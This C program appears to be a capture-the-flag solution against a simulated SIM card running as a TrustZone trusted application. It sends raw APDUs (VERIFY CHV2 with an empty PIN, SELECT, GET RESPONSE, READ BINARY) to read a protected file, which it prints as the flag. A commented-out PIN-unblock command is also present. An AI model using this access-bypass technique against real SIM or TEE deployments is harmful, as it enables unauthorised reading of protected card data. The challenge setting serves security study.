#include <err.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <tee_client_api.h>
#include <sim_ta.h>

#define SOCKET_TZ_MAX_MSG_LEN  (5+256)

TEEC_Context ctx;
TEEC_Session sess;


static char hexd_buff[4096];
static const char hex_chars[] = "0123456789abcdef";

struct apdu_reply_select_ef {
    uint8_t rfu1[2];
    uint16_t file_size;
    uint16_t file_id;
    uint8_t file_type;
    uint8_t cyclic_increase_allowed;
    uint8_t access_conditions[3];
    uint8_t file_status;
    uint8_t len_additional_data;

    uint8_t ef_structure;
    uint8_t record_len;
} __attribute__((packed));

char *util_hexdump(const unsigned char *buf, int len)
{
    int i;
    char *cur = hexd_buff;

    hexd_buff[0] = 0;
    for (i = 0; i < len; i++) {
        const char *delimp = " ";
        int len_remain = sizeof(hexd_buff) - (cur - hexd_buff);
        if (len_remain < 3)
            break;

        *cur++ = hex_chars[buf[i] >> 4];
        *cur++ = hex_chars[buf[i] & 0xf];

        while (len_remain > 1 && *delimp) {
            *cur++ = *delimp++;
            len_remain--;
        }

        *cur = 0;
    }
    hexd_buff[sizeof(hexd_buff)-1] = 0;
    return hexd_buff;
}

void prepare_tee_session()
{
    TEEC_UUID uuid = TA_SIM_UUID;
    uint32_t origin;
    TEEC_Result res;

    /* Initialize a context connecting us to the TEE */
    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

    /* Open a session with the TA */
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                   TEEC_LOGIN_PUBLIC, NULL, NULL, &origin);
    if (res != TEEC_SUCCESS)
        errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
            res, origin);
}

void terminate_tee_session()
{
    TEEC_CloseSession(&sess);
    TEEC_FinalizeContext(&ctx);
}

int trustzonecard_send_apdu(uint8_t *data, uint16_t length, uint8_t *reply, uint16_t reply_buf_len)
{
    TEEC_Operation op;
    uint32_t origin;
    TEEC_Result res;

    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
                     TEEC_MEMREF_TEMP_OUTPUT,
                     TEEC_NONE, TEEC_NONE);

    op.params[0].tmpref.buffer = data;
    op.params[0].tmpref.size = length;

    op.params[1].tmpref.buffer = reply;
    op.params[1].tmpref.size = reply_buf_len;

    printf("Sending 0x%x bytes: %s\n", length, util_hexdump(data, length));
    res = TEEC_InvokeCommand(&sess,
                 TA_SIM_CMD_TRANSFER,
                 &op, &origin);
    printf("Received back 0x%02x bytes: %s\n", op.params[1].tmpref.size, util_hexdump(op.params[1].tmpref.buffer, op.params[1].tmpref.size));

    if (res != TEEC_SUCCESS) {
        printf("Trustzone SIM APDU transfer failed: 0x%x / %u\n", res, origin);
        return -1;
    }

    return op.params[1].tmpref.size;
}

void do_unblock()
{
    uint8_t unblock_chv2[] = {0xA0, 0x2C, 0x00, 0x02, 0x10,   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,     '1', '2', '3', '4', 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t reply[2] = {0};

    trustzonecard_send_apdu(unblock_chv2, sizeof(unblock_chv2), reply, sizeof(reply));

    if(reply[0] == 0x90 && reply[1] == 0x00)
        printf("UNBLOCK CHV2 success\n");
    else
        printf("UNBLOCK CHV2 error: SW1: 0x%02x SW2: 0x%02x\n", reply[0], reply[1]);
}

void do_verify()
{
    uint8_t verify_chv2[] = {0xA0, 0x20, 0x00, 0x02, 0x08,   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t reply[2] = {0};

    trustzonecard_send_apdu(verify_chv2, sizeof(verify_chv2), reply, sizeof(reply));

    if(reply[0] == 0x90 && reply[1] == 0x00)
        printf("VERIFY CHV2 success\n");
    else
        printf("VERIFY CHV2 error: SW1: 0x%02x SW2: 0x%02x\n", reply[0], reply[1]);
}

void select_file()
{
    uint8_t select_file[] = {0xA0, 0xA4, 0x00, 0x00, 0x02, 0x43, 0x33};
    uint8_t reply[2] = {0};

    trustzonecard_send_apdu(select_file, sizeof(select_file), reply, sizeof(reply));

    if(reply[0] == 0x9F)
        printf("SELECT success: SW2: 0x%02x\n", reply[1]);
    else
        printf("SELECT error: SW1: 0x%02x SW2: 0x%02x\n", reply[0], reply[1]);
}

uint16_t get_select_resp()
{
    uint8_t get_response[] = {0xA0, 0xC0, 0x00, 0x00, 0xF};
    uint8_t reply[sizeof(struct apdu_reply_select_ef) + 2] = {0};

    trustzonecard_send_apdu(get_response, sizeof(get_response), reply, sizeof(reply));
    struct apdu_reply_select_ef *sr = (struct apdu_reply_select_ef *)reply;

    printf("File len is 0x%04x\n", sr->file_size >> 8);

    return sr->file_size >> 8;
}

void get_file(uint8_t file_len)
{
    uint8_t read_binary[] = {0xA0, 0xB0, 0x00, 0x00, file_len};
    uint8_t reply[file_len + 2];
    memset(reply, 0, file_len + 2);

    int r = trustzonecard_send_apdu(read_binary, sizeof(read_binary), reply, sizeof(reply));

    if(r > 2 && reply[r-2] == 0x90 && reply[r-1] == 0x00) {
        printf("Flag: %s\n", (char*)reply);
    }
    else
        printf("READ BINARY error: SW1: 0x%02x SW2: 0x%02x\n", reply[0], reply[1]);
}

int main(int argc, char *argv[])
{
    prepare_tee_session();

    //do_unblock();

    printf("Verifying empty CHV2\n");
    do_verify();

    printf("\nSelecting file\n");
    select_file();

    printf("\nGetting select response\n");
    uint8_t file_len = get_select_resp();

    printf("\nRetrieving file with length %u\n", file_len);
    get_file(file_len);

    terminate_tee_session();
    return 0;
}
